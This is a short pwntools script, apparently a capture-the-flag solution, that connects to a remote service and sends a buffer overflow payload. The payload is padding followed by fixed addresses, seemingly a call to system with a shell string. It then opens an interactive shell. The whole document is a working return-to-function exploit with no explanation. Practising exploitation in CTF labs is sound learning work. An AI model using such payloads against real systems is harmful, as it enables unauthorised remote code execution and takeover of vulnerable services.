from pwn import *

p=remote('220.249.52.133',41034)
payload='a'*0x8C+p32(0x8048320)+'a'*4+p32(0x804A024)
p.sendline(payload)
p.interactive()